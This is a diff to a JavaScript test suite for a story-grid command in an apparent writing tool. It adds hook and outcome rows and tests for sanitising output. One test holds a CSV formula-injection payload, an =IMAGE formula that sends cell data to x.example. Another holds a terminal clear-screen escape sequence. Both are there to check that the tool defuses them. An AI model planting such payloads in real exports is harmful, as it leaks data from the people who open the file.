@@ -163,7 +163,7 @@ describe("story grid", () => {
     expect(envelope.data.rows.find((row) => row.id === "romance")).toMatchObject({ name: "romance", status: "active", known: true, cells: [false, true] });
   });
 
-  test("once any chapter has a beat, a (beat) row replaces the hook and outcome rows", () => {
+  test("once any chapter has a beat, a (beat) row sits above the hook and outcome rows", () => {
     const root = sampleProject();
     const chapter = path.join(root, "chapters", "chapter-03.md");
     fs.writeFileSync(chapter, fs.readFileSync(chapter, "utf8").replace("status: draft\n", "status: draft\nbeat: Midpoint\n"), "utf8");
@@ -172,13 +172,15 @@ describe("story grid", () => {
     expect(code).toBe(0);
     expect(err).toBe("");
     expect(out).toBe([
-      "| Arc                 | 1   | 2   | 3        | 4                         |",
-      "|---------------------|:---:|:---:|:--------:|:-------------------------:|",
-      "| romance             | x   |     | x        |                           |",
-      "| heist               |     | x   |          |                           |",
-      "| dropped-thread      |     |     |          |                           |",
-      "| ghost-arc (unknown) |     | x   |          |                           |",
-      "| (beat)              |     |     | Midpoint | All Is Lost \\| Dark Night |",
+      "| Arc                 | 1            | 2           | 3        | 4                         |",
+      "|---------------------|:------------:|:-----------:|:--------:|:-------------------------:|",
+      "| romance             | x            |             | x        |                           |",
+      "| heist               |              | x           |          |                           |",
+      "| dropped-thread      |              |             |          |                           |",
+      "| ghost-arc (unknown) |              | x           |          |                           |",
+      "| (beat)              |              |             | Midpoint | All Is Lost \\| Dark Night |",
+      "| (hook)              | question     | cliffhanger |          | cliffhanger               |",
+      "| (outcomes)          | yes-but, yes |             | no-and   |                           |",
       ""
     ].join("\n"));
   });
@@ -186,15 +188,62 @@ describe("story grid", () => {
   test("a range with no beats still shows the (beat) row when the book has them", () => {
     const root = sampleProject();
     writeChapter(root, 4, "beat: \"Catalyst, late\"");
-    expect(invoke(root, ["grid", "--format", "csv", "--to", "2"]).out).toBe("Arc,1,2\nromance,x,\nheist,,x\ndropped-thread,,\nghost-arc (unknown),,x\n(beat),,\n");
-    expect(invoke(root, ["grid", "--format", "csv", "--from", "4"]).out).toBe("Arc,4\nromance,\nheist,\ndropped-thread,\nghost-arc (unknown),\n(beat),\"Catalyst, late\"\n");
+    expect(invoke(root, ["grid", "--format", "csv", "--to", "2"]).out).toBe("Arc,1,2\nromance,x,\nheist,,x\ndropped-thread,,\nghost-arc (unknown),,x\n(beat),,\n(hook),question,cliffhanger\n(outcomes),\"yes-but, yes\",\n");
+    expect(invoke(root, ["grid", "--format", "csv", "--from", "4"]).out).toBe("Arc,4\nromance,\nheist,\ndropped-thread,\nghost-arc (unknown),\n(beat),\"Catalyst, late\"\n(hook),\n(outcomes),\n");
   });
 
   test("a beat written over several lines shows on one, and a beat that is not text shows as none", () => {
     const root = gridProject();
     writeChapter(root, 1, "beat: |\n  Break into\n    Two  ");
     writeChapter(root, 2, "beat: 1984");
-    expect(invoke(root, ["grid", "--format", "csv"]).out).toBe("Arc,1,2\n(beat),Break into Two,\n");
+    expect(invoke(root, ["grid", "--format", "csv"]).out).toBe("Arc,1,2\n(beat),Break into Two,\n(hook),,\n(outcomes),,\n");
+  });
+
+  test("blank beats, ~ among them, leave the book without a beat row (#531)", () => {
+    const root = gridProject();
+    writeChapter(root, 1, "beat: \"\"\nhook: question");
+    writeChapter(root, 2, "beat: \"   \"");
+    writeChapter(root, 3, "beat: ~");
+    expect(invoke(root, ["grid", "--format", "csv"]).out).toBe("Arc,1,2,3\n(hook),question,,\n(outcomes),,,\n");
+    expect(JSON.parse(invoke(root, ["grid", "--json"]).out).data.beats).toBe(false);
+  });
+
+  test("a control character in a beat prints as U+FFFD, so it cannot drive the terminal", () => {
+    const root = gridProject();
+    writeChapter(root, 1, "beat: \"Mid\\u001b[2Jpoint,\\tlate\"");
+    expect(invoke(root, ["grid", "--format", "csv"]).out).toBe("Arc,1\n(beat),\"Mid\ufffd[2Jpoint, late\"\n(hook),\n(outcomes),\n");
+  });
+
+  test("--format csv starts a cell a spreadsheet would read as a formula with a quote", () => {
+    const root = gridProject();
+    writeChapter(root, 1, "beat: \"=IMAGE(CONCAT(\\\"https://x.example/?q=\\\";A2))\"");
+    writeChapter(root, 2, "beat: \"+1 twist\"\narcs-advanced:\n  - \"@sum\"");
+    writeChapter(root, 3, "beat: \"- Midpoint\"");
+    expect(invoke(root, ["grid", "--format", "csv"]).out).toBe([
+      "Arc,1,2,3",
+      "'@sum (unknown),,x,",
+      "(beat),\"'=IMAGE(CONCAT(\"\"https://x.example/?q=\"\";A2))\",'+1 twist,'- Midpoint",
+      "(hook),,,",
+      "(outcomes),,,",
+      ""
+    ].join("\n"));
+    // The markdown table is not a spreadsheet, so it shows the text as is.
+    expect(invoke(root, ["grid"]).out).toContain("| =IMAGE(");
+  });
+
+  test("columns line up by terminal width for wide and combining characters", () => {
+    const root = gridProject();
+    writeChapter(root, 1, "beat: 中点");
+    writeChapter(root, 2, "beat: \"🔥 All Is Lost\"");
+    writeChapter(root, 3, "beat: Cafe\u0301 scene");
+    const lines = invoke(root, ["grid"]).out.trimEnd().split("\n");
+    expect(lines).toEqual([
+      "| Arc        | 1    | 2              | 3          |",
+      "|------------|:----:|:--------------:|:----------:|",
+      "| (beat)     | 中点 | 🔥 All Is Lost | Cafe\u0301 scene |",
+      "| (hook)     |      |                |            |",
+      "| (outcomes) |      |                |            |"
+    ]);
   });
 
   test("--json gives each chapter's beat and whether the book has any", () => {
@@ -209,7 +258,6 @@ describe("story grid", () => {
     const envelope = JSON.parse(out);
     expect(validateAgainstSchema(envelope, schema)).toEqual([]);
     expect(envelope.data.beats).toBe(true);
-    // The hooks and outcomes stay in the data, as story pacing reads them.
     expect(envelope.data.chapters.map((chapter) => [chapter.id, chapter.beat, chapter.hook, chapter.outcomes])).toEqual([
       ["chapter-03", "", "", ["no-and"]],
       ["chapter-04", "Finale", "resolution", []]
